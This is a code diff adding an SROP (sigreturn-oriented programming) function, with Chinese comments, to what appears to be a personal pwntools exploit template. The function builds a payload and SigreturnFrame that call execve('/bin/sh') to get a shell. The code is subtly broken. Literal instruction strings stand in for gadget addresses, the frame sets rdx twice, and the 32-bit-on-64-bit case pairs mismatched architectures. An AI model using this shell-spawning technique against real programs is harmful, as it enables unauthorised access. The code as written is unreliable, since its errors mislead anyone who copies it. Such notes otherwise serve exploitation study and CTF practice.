@@ -137,9 +137,48 @@ def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
     io.send(payload)
     
     # 之后，程序会取执行rop链
+
+
+def ret2sigReturn():
+    '''
+    SROP: 要么有触发sigReturn的gadget，要么可以利用mov rax 15;syscall来触发。
+    这里还需要/bin/sh的地址，需要想办法泄露出来
+    栈空间要足够大，如果不够大，可以考虑栈迁移，填充的栈从低到高依次为：
+    mov rax 0xf
+    syscall_ret gadget
+    sigreturnFrame
     
-def ret2sigreturn():
-    pass
+    
+    '''
+    # 需要注意，要设置一下context.arch 和kernel，如下所示
+    # 如果系统为32位，程序位32位
+    context.arch='i386'
+    frame = SigreturnFrame('i386')
+    # 如果是64位系统 64位程序
+    context.arch = 'amd64'
+    frame = SigreturnFrame('amd64')
+    
+    # 如果是64位系统下跑32位程序
+    context.arch = 'i386'
+    frame = SigreturnFrame('amd64')
+    
+    # 以下位payload
+    payload = b'/bin/sh\x00' + b'a' * 0x0 # 这里注意，如果没有/bin/sh地址可以将/bin/sh写在栈上，然后泄露栈地址，计算偏移。这里覆盖到rbp。
+    payload += b'mov rax, 0xf' # 执行该指令的地址
+    payload += b'syscall; ret' # 该gadget的地址
+    # 以下为sigreturn 帧
+    frame.rax = 0x3b
+    frame.rdx = b'/bin/sh addr' # /bin/sh的地址
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = b'syscall' # syscall的地址
+    frame.rsp = 0x00 # 如果想继续往下执行，可以把上面的rip改为syscall ; ret。然后rsp改为下一个帧的起始地址。如果不需要的话，可以设为0。
+    
+    payload += bytes(frame)
+    
+    # io.send(payload) # 发送出去即可
+    
+    
     
     
     
